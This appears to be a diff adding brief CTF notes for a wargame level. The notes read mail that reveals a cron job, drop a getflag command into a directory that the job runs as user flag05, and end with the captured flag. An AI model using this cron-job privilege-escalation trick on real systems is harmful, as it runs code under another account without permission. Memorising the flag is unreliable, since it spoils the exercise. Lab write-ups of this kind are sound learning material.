@@ -1,0 +1,7 @@
+step 1 : i'm received mail (a You have new mail.) 
+step 2 : i'm reading the mail cat /var/mail/level05 ` */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 `
+step 3 : i'm reading the openarenaserver file > ( cat /usr/sbin/openarenaserver )
+step 4 : create script /tmp/flag
+step 5 : echo "getflag > /tmp/flag" > /opt/openarenaserver/getflag
+step 6 : cat /tmp/flag
+glag : viuaaale9huek52boumoomioc
